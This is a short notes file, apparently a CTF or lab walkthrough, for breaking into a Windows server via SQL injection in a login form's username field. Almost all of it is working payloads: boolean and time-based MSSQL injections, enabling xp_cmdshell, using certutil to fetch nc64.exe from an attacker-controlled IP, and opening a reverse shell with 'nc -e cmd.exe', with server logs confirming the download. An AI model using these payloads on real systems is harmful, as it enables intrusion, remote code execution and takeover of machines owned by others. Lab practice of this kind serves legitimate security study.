@@ -1,0 +1,35 @@
+# Test the login form and indicate the username textbox injectable
+Return in TRUE results of boolean
+
+UsernameTextBox=admin'AND 1=1 --
+
+From NMAP scanning we found out it is running with most of the Windows Port
+So, we can assume it is MSSQL atm. Lets try to inject with MSSQL Code
+Return with valid delayed 5 second
+References: https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1
+https://musyokaian.medium.com/time-based-sql-injection-hsctf-big-blind-writeup-f3a320d63ea8
+
+UsernameTextBox=1'WAITFOR DELAY '0:0:5'--
+
+Then lets try to enable xp_cmdshell function to takes a string and passes to it command shell for execution
+
+UsernameTextBox=1';EXECUTE sp_configure 'show advanced options', 1;--
+UsernameTextBox=1';RECONFIGURE;--
+UsernameTextBox=1';EXECUTE sp_configure 'xp_cmdshell', 1;--
+UsernameTextBox=1';RECONFIGURE;--
+
+Try the xp_cmdshell to use certutil fetch the nc64.exe to the server
+
+UsernameTextBox=1';EXEC xp_cmdshell "certutil.exe -urlcache -f http://192.168.45.191:88/nc64.exe C:/Windows/Temp/nc64.exe";--
+
+Http status feedback with
+192.168.158.50 - - [10/Apr/2024 19:28:14] "GET /nc64.exe HTTP/1.1" 200 -
+192.168.158.50 - - [10/Apr/2024 19:28:14] "GET /nc64.exe HTTP/1.1" 200 -
+Means it is working
+
+Then nc to attacker machine
+nc -lvnp 8443
+UsernameTextBox=1';EXEC xp_cmdshell "C:/Windows/Temp/nc64.exe <ip> 8443 -e cmd.exe";--
+
+Then successful intrude into the Windows system and flag is located at C:/inetpub/wwwroot
+
